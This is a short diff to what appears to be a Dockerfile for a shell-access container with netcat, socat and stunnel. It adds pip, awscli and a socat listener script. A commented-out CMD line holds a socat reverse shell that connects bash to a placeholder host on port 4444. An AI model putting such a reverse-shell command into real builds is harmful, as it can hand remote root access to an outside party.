@@ -13,6 +13,7 @@ RUN apt-get -qy update                  &&  \
         netcat                              \
         openssh-server                      \
         python3                             \
+        python3-pip                         \
         screen                              \
         socat                               \
         stunnel                             \
@@ -25,9 +26,11 @@ RUN apt-get -qy update                  &&  \
         chmod 0700 /root/.ssh           &&  \
         apt-get -qy clean               &&  \
         apt-get -qy autoclean           &&  \
-        apt-get -qy autoremove --purge
+        apt-get -qy autoremove --purge  &&  \
+        pip3 install awscli --upgrade
 COPY sshd_config /etc/ssh/sshd_config
 COPY profile /root/.profile
+COPY socat-listener.sh /
 COPY run_ssh.sh /root/run_ssh.sh
 #COPY sshkey.pub /root/.ssh/authorized_keys
 #CMD ["/usr/bin/socat","exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:YOURHOST.INVALID.COM:4444"]
